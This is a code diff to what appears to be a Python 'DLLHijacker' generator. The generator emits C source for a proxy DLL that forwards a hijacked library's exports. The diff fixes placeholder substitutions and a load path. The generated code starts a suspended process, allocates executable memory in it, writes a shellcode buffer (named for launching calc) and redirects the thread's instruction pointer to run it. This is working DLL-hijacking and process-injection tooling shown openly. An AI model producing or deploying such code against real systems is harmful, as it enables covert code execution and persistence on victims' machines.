@@ -57,7 +57,7 @@ namespace DLLHijacker
     inline BOOL WINAPI Load()
     {
         TCHAR tzPath[MAX_PATH];
-        lstrcpy(tzPath, TEXT("TEAMPLATE_DLLNAME"));
+        lstrcpy(tzPath, TEXT("common\\TEAMPLATE_DLLNAME"));
         m_hModule = LoadLibrary(tzPath);
         if (m_hModule == NULL)
             return FALSE;
@@ -121,7 +121,7 @@ X86DLLHIJACKER_PROC
             get_proc_addr += '''ALCDECL Hijack_%s(void)\n{\n\t\t__asm POP m_dwReturn[0 *TYPE long];\n\t\tGetAddress("%s")();\n\t\t__asm JMP m_dwReturn[0 * TYPE long];\n}\r\n''' % (
                 sym.name.decode('utf8'), sym.name.decode('utf8'))
         else:
-            get_proc_addr += '''Hijack_%s = GetAddress("%s");\n\t\t''' % (
+            get_proc_addr += '''Hijack_%s = GetAddress("%s");\n\t\t\t''' % (
                 sym.name.decode('utf8'), sym.name.decode('utf8'))
 
     if is32bit:
@@ -182,7 +182,7 @@ X86DLLHIJACKER_PROC
 	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
 	StartupInfo.cb = REPLACE_0X1;
 	if (CreateProcess(0, CommandLine, 0, 0, 0, 0x44, 0, 0, (LPSTARTUPINFOW)&StartupInfo, &ProcessInformation)) {
-		Context.ContextFlags = REPLACE_0X2; 65539
+		Context.ContextFlags = REPLACE_0X2;
 		GetThreadContext(ProcessInformation.hThread, &Context);
 		lpBaseAddress = VirtualAllocEx(ProcessInformation.hProcess, 0, 0x800u, 0x1000u, 0x40u);
 		WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, &shellcode_calc, 0x800u, 0);
@@ -195,15 +195,15 @@ X86DLLHIJACKER_PROC
 }
 '''
     if is32bit:
-      hijackfunc = hijackfunc.replace('EREPLACE_0X1', '68')
-      hijackfunc = hijackfunc.replace('EREPLACE_0X2', '65539')
-      hijackfunc = hijackfunc.replace('EREPLACE_0X3', 'Eip')
-      hijackfunc = hijackfunc.replace('EREPLACE_0X4', 'DWORD')
+      hijackfunc = hijackfunc.replace('REPLACE_0X1', '68')
+      hijackfunc = hijackfunc.replace('REPLACE_0X2', '65539')
+      hijackfunc = hijackfunc.replace('REPLACE_0X3', 'Eip')
+      hijackfunc = hijackfunc.replace('REPLACE_0X4', 'DWORD')
     else:
-      hijackfunc = hijackfunc.replace('EREPLACE_0X1', '104')
-      hijackfunc = hijackfunc.replace('EREPLACE_0X2', '1048579')
-      hijackfunc = hijackfunc.replace('EREPLACE_0X3', 'Rip')
-      hijackfunc = hijackfunc.replace('EREPLACE_0X4', 'DWORD64')
+      hijackfunc = hijackfunc.replace('REPLACE_0X1', '104')
+      hijackfunc = hijackfunc.replace('REPLACE_0X2', '1048579')
+      hijackfunc = hijackfunc.replace('REPLACE_0X3', 'Rip')
+      hijackfunc = hijackfunc.replace('REPLACE_0X4', 'DWORD64')
 
 
     dllmain = dllmain.replace('TEAMPLATE_DLLNAME', dllname)
